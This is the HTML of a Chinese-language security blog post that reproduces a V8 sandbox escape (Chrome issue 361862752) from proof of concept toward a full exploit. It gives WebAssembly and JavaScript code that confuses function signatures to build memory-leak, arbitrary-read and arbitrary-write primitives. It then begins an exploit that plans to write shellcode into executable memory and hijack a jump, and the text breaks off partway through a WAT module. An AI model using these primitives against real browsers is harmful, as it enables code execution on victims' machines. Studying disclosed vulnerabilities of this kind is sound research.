@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Loora1N">
+
+
+
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【V8】Sanbox Escape复现issue: 361862752 | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
+
+    <script src='https://unpkg.com/valine@1.4.16/dist/Valine.min.js'></script>
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                【V8】Sanbox Escape复现issue: 361862752
+            
+            
+        </div>
+        <span class="post-date">
+            4月 15, 2025
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
+<p>上次做了一个相当于POC -&gt; EXP的漏洞复现，感觉还挺有意思。</p>
+<p>准备最近工作之余有空就看看chrome issue里面有没有好玩的sandbox escape漏洞。争取做一个poc2exp的复现系列</p>
+</blockquote>
+<h2 id="Issue-Tracker"><a href="#Issue-Tracker" class="headerlink" title="Issue Tracker"></a>Issue Tracker</h2><blockquote>
+<p>详细信息：<a target="_blank" rel="noopener" href="https://issuetracker.google.com/issues/361862752">https://issuetracker.google.com/issues/361862752</a></p>
+<p>poc view：<a target="_blank" rel="noopener" href="https://issuetracker.google.com/action/issues/361862752/attachments/58895313?download=false">https://issuetracker.google.com/action/issues/361862752/attachments/58895313?download=false</a></p>
+<p>poc download: <a target="_blank" rel="noopener" href="https://issuetracker.google.com/action/issues/361862752/attachments/58895313?download=true">https://issuetracker.google.com/action/issues/361862752/attachments/58895313?download=true</a></p>
+</blockquote>
+<h3 id="issue基本信息"><a href="#issue基本信息" class="headerlink" title="issue基本信息"></a>issue基本信息</h3><ul>
+<li>v8 commit: <code>779c29ef6a4b0191efe579ff067754219e9b420b</code></li>
+<li>漏洞：函数签名混淆</li>
+</ul>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><blockquote>
+<p>在正式开始前，先补充一些基本信息</p>
+</blockquote>
+<h4 id="安装wasm-as"><a href="#安装wasm-as" class="headerlink" title="安装wasm-as"></a>安装wasm-as</h4><p>首先需要安装wasm-as，用于将wat代码转换为wasm字节码后面会用到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆带子模块的完整仓库</span></span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/WebAssembly/binaryen.git</span><br><span class="line"><span class="built_in">cd</span> binaryen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 + 跳过测试</span></span><br><span class="line">cmake -DBUILD_TESTS=OFF .</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加环境变量</span></span><br><span class="line"><span class="built_in">cd</span> ./bin/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PATH:&#x27;</span>$(<span class="built_in">pwd</span>)<span class="string">&#x27;&quot;&#x27;</span> &gt;&gt; ~/.zshrc </span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>安装成功测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm-as --version</span><br></pre></td></tr></table></figure>
+
+<p>输出类似如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌─[loorain@Loora1N-16pro] - [~/v8/binaryen] - [10296]</span><br><span class="line">└─[$] wasm-as --version</span><br><span class="line">wasm-as version 123 (version_123-50-g755a8d0ed)</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><blockquote>
+<p>POC的完整代码可以从文章开头的链接获取</p>
+</blockquote>
+<h3 id="WAT"><a href="#WAT" class="headerlink" title="WAT"></a>WAT</h3><p>首先poc包含了一段WAT的注释，用于代表<code>wasmCode</code>的字节码内容来源</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">module</span></span><br><span class="line">    (type $<span class="built_in">struct</span> (<span class="built_in">struct</span> (field $<span class="built_in">sfield</span> (mut i64))))</span><br><span class="line"></span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;struct_placeholder&quot;</span>)</span><br><span class="line">        (<span class="built_in">result</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (<span class="keyword">struct</span>.<span class="keyword">new</span> $<span class="built_in">struct</span> (i64.<span class="type">const</span> <span class="number">1234</span>))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;write64&quot;</span>)</span><br><span class="line">        (param $addr i64)</span><br><span class="line">        (param $val i64)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;write64_struct&quot;</span>)</span><br><span class="line">        (param $<span class="built_in">sval</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (param $val i64)</span><br><span class="line"></span><br><span class="line">        (<span class="keyword">struct</span>.set $<span class="keyword">struct</span> $<span class="built_in">sfield</span> (local.get $sval) (local.get <span class="number">1</span>))</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>包含如下几个部分：</p>
+<ol>
+<li><code>$struct</code>结构体，有一个i64域</li>
+<li><code>struct_placeholder</code>，用于创建并返回一个新的<code>$struct</code></li>
+<li><code>write64</code>，SharedFunctionInfo类型为<code>js-to-wasm:ll:</code></li>
+<li><code>write64_struct</code>，SharedFunctionInfo类型为<code>js-to-wasm:rl:</code></li>
+</ol>
+<h4 id="SharedFunctionInfo"><a href="#SharedFunctionInfo" class="headerlink" title="SharedFunctionInfo"></a>SharedFunctionInfo</h4><p>这里略微补充下下关于<code>SharedFunctionInfo</code>的内容，当我们使用<code>%DebugPrint</code>查看wasm函数信息时，会得到类似如下一行</p>
+<p><img src="/img/article/v8-361862752/image-20250415105755008.png"></p>
+<p>其中保存了函数的相关信息，以及我们后面要进行替换的<code>trusted_function_data</code>指针，具体如图：</p>
+<p><img src="/img/article/v8-361862752/image-20250415110801732.png" alt="image-20250415110801732"></p>
+<p>这里的<code>:ll:</code>代表了函数参数和返回值类型。</p>
+<blockquote>
+<p>第一个 <strong>“:”</strong> 后代表函数的参数类型，第二个 <strong>“:”</strong> 后代表返回值类型。举几个例子：</p>
+<ul>
+<li><code>:ll:</code> 代表<strong>param(i64, i64) –&gt; result(NULL)</strong></li>
+<li><code>:rl:</code>代表<strong>param($struct, i64) –&gt; result(NULL)</strong></li>
+<li><code>:l:l</code> 代表<strong>param(i64) –&gt; result(i64)</strong></li>
+</ul>
+</blockquote>
+<h4 id="WAT-2-WASM"><a href="#WAT-2-WASM" class="headerlink" title="WAT 2 WASM"></a>WAT 2 WASM</h4><p>我们也可以自己编写的WAT，然后通过<code>wasm-as</code>进行转换:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm-as --enable-reference-types --enable-gc xxx.wat -o xxx.wasm</span><br></pre></td></tr></table></figure>
+
+<p>保存为wasm文件后，可以使用脚本生成js中<code>Array</code>的格式。这里我用GPT生成了一个python脚本，仅供参考</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xxx.wasm&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;let wasmCode = new Uint8Array([&#123;&#125;]);&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> data)))</span><br></pre></td></tr></table></figure>
+
+<p>运行截图：</p>
+<p><img src="/img/article/v8-361862752/image-20250415150023423.png" alt="image-20250415150023423"></p>
+<h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
+<p>有了上一篇文章的经验，这个POC相对比较简单</p>
+</blockquote>
+<p>直接使用gdb调试运行，卡在非法地址写</p>
+<p><img src="/img/article/v8-361862752/image-20250415151606485.png" alt="image-20250415151606485"></p>
+<p>对应POC中的代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//Write to the target page to demonstrate the sandbox escape</span></span><br><span class="line"><span class="title function_">write64</span>(<span class="title class_">BigInt</span>(<span class="title class_">Sandbox</span>.<span class="property">targetPage</span>), <span class="number">1234n</span>);</span><br></pre></td></tr></table></figure>
+
+<p>1234n对应16进制为0x4d2，也就是说这个POC本身就是一个了任意地址写原语。</p>
+<h4 id="调用优化"><a href="#调用优化" class="headerlink" title="调用优化"></a>调用优化</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Ensure the write64_struct WASM function is fully optimized</span></span><br><span class="line"><span class="comment">//This causes the elimination of any potential type checks from the function, essentially turning it into a thinly wrapped write primitive</span></span><br><span class="line"><span class="keyword">let</span> placeholder = wasmInst.<span class="property">exports</span>.<span class="title function_">struct_placeholder</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmWrite64Struct</span>(placeholder, <span class="number">0n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Ensure the write64 JS2WASM stub is a purpose-compiled one instead of the generic Torque stub</span></span><br><span class="line"><span class="comment">//This bakes write64&#x27;s (int64, int64) signature into the generated assembly code, independent of the function&#x27;s stored signature</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmWrite64</span>(<span class="number">0n</span>, <span class="number">0n</span>);</span><br></pre></td></tr></table></figure>
+
+<p>首先需要对WAT定义的函数进行优化</p>
+<h4 id="trusted-function-data替换"><a href="#trusted-function-data替换" class="headerlink" title="trusted_function_data替换"></a>trusted_function_data替换</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> write64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64Struct) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructTFD = <span class="title function_">hread32</span>(write64StructSFI + <span class="number">0x4</span>);</span><br><span class="line"><span class="title function_">hwrite32</span>(write64SFI + <span class="number">0x4</span>, write64StructTFD);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>通过特定偏移获取<code>SharedFunctionInfo</code>中的<code>trused_function_data</code>指针。将<code>write64</code>的指针替换为<code>write64struct</code>的指针。总体来看，POC逻辑还是比较简单的。</p>
+<h2 id="Leak-amp-AAW"><a href="#Leak-amp-AAW" class="headerlink" title="Leak &amp; AAW"></a>Leak &amp; AAW</h2><p>我们已经有了沙盒外的任意地址写，接下来还需要:</p>
+<ul>
+<li>rwx段的地址泄露</li>
+<li>沙盒外的AAW任意地址读</li>
+</ul>
+<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p>有了之前的基础，我们很容易就想到：<strong>将多参数函数与无参函数混淆便可进行内存泄露</strong></p>
+<p>WAT实现：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">module</span></span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        (result i64)</span><br><span class="line">        (i64.<span class="type">const</span> <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;leak_i64&quot;</span>)</span><br><span class="line">        (param $val1 i64)</span><br><span class="line">        (param $val2 i64)</span><br><span class="line">        (param $val3 i64)</span><br><span class="line">        (result i64)</span><br><span class="line">        (local.get $val3)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里使用<code>$val3</code>是多次调试的结果，能够稳定泄露rwx段的地址</p>
+</blockquote>
+<p>新构建POC，与之前类似</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">19</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">66</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInst = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmLeak = wasmInst.<span class="property">exports</span>.<span class="property">leak</span>;</span><br><span class="line"><span class="keyword">let</span> wasmLeaki64 = wasmInst.<span class="property">exports</span>.<span class="property">leak_i64</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmLeaki64</span>(<span class="number">0n</span>, <span class="number">0n</span>, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmLeak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> heapView = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(<span class="number">0</span>, <span class="number">0x100000000</span>));</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">addrof</span> = (<span class="params">obj</span>) =&gt; <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hread32</span> = (<span class="params">addr</span>) =&gt; heapView.<span class="title function_">getUint32</span>(addr, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hwrite32</span> = (<span class="params">addr, val</span>) =&gt; heapView.<span class="title function_">setUint32</span>(addr, val, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> leaki64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmLeaki64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> leakSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmLeak) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> leaki64TFD = <span class="title function_">hread32</span>(leaki64SFI + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmLeaki64);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmLeak);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">hwrite32</span>(leakSFI + <span class="number">0x4</span>, leaki64TFD);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">wasmLeak</span>();</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> something = <span class="title function_">leak</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmLeak);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmLeaki64);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(something);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;something :0x&quot;</span>+something.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行可得</p>
+<p><img src="/img/article/v8-361862752/image-20250415154204795.png" alt="image-20250415154204795"></p>
+<p><img src="/img/article/v8-361862752/image-20250415154211584.png" alt="image-20250415154211584"></p>
+<h3 id="AAW"><a href="#AAW" class="headerlink" title="AAW"></a>AAW</h3><p>类似的，我们混淆<code>param($struct)</code> 和 <code>param(i64)</code>，即可实现</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">module</span></span><br><span class="line">	(<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;read64&quot;</span>)</span><br><span class="line">        (param $addr i64)</span><br><span class="line">        (result i64)</span><br><span class="line">        (i64.<span class="type">const</span> <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;read64_struct&quot;</span>)</span><br><span class="line">        (param $<span class="built_in">sval</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (result i64)</span><br><span class="line">        (<span class="keyword">struct</span>.get $<span class="keyword">struct</span> $<span class="built_in">sfield</span> (local.get $sval))</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>其他部分与之前的原语构建类似</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">wasmRead64</span>(addr - <span class="number">7n</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rwx_addr = <span class="title function_">leak</span>() - <span class="number">0x14n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rwx_addr: 0x&quot;</span>+rwx_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> something = <span class="title function_">read64</span>(rwx_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;something: 0x&quot;</span>+something.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到的确可以进行任意地址读</p>
+<p><img src="/img/article/v8-361862752/image-20250415160013154.png" alt="image-20250415160013154"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>下面可以开始实现EXP，这里我使用和上一篇文章一样的漏洞利用方式</p>
+<ul>
+<li>新建一个boom函数</li>
+<li>写入shellcode</li>
+<li>进行jmp地址的跳转劫持</li>
+</ul>
+<p>WAT构建如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">module</span></span><br><span class="line">    (type $<span class="built_in">struct</span> (<span class="built_in">struct</span> (field $<span class="built_in">sfield</span> (mut i64))))</span><br><span class="line"></span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;struct_placeholder&quot;</span>)</span><br><span class="line">        (<span class="built_in">result</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (<span class="keyword">struct</span>.<span class="keyword">new</span> $<span class="built_in">struct</span> (i64.<span class="type">const</span> <span class="number">1234</span>))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;write64&quot;</span>)</span><br><span class="line">        (param $addr i64)</span><br><span class="line">        (param $val i64)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;write64_struct&quot;</span>)</span><br><span class="line">        (param $<span class="built_in">sval</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (param $val i64)</span><br><span class="line"></span><br><span class="line">        (<span class="keyword">struct</span>.set $<span class="keyword">struct</span> $<span class="built_in">sfield</span> (local.get $sval) (local.get <span class="number">1</span>))</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        (result i64)</span><br><span class="line">        (i64.<span class="type">const</span> <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;leak_i64&quot;</span>)</span><br><span class="line">        (param $val1 i64)</span><br><span class="line">        (param $val2 i64)</span><br><span class="line">        (param $val3 i64)</span><br><span class="line">        (result i64)</span><br><span class="line">        (local.get $val3)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;read64&quot;</span>)</span><br><span class="line">        (param $addr i64)</span><br><span class="line">        (result i64)</span><br><span class="line">        (i64.<span class="type">const</span> <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span class="string">&quot;read64_struct&quot;</span>)</span><br><span class="line">        (param $<span class="built_in">sval</span> (ref $<span class="keyword">struct</span>))</span><br><span class="line">        (result i64)</span><br><span class="line">        (<span class="keyword">struct</span>.get $<span class="keyword">struct</span> $<span class="built_in">sfield</span> (local.get $sval))</span><br><span class="line">    )</span><br><span class="line">    (<span class="built_in">func</span> (<span class="keyword">export</span> <span 